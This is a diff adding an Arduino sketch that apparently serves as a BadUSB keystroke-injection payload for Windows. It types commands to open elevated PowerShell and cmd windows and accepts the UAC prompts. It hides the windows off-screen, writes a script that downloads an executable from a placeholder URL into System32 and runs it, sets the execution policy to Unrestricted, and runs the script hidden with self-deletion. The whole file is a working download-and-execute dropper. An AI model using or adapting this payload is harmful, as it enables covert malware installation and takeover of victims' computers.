@@ -1,0 +1,136 @@
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("powershell Start-Process notepad -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("m");
+
+  delay(1000);
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("(New-Object Net.Webclient).DownloadFile('http://URLDEPRUEBA.COM',\"C:\\Windows\\System32\\30704.exe\"); Start-Process -FilePath \"C:\\Windows\\System32\\30704.exe\"");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Remove-Item $MyINvocation.InvocationName");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("C:\\Windows\\config-30704.ps1");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("powershell Start-Process cmd -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("mode con:cols=14 lines=1");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("m");
+
+  delay(100);
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-30704.ps1");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
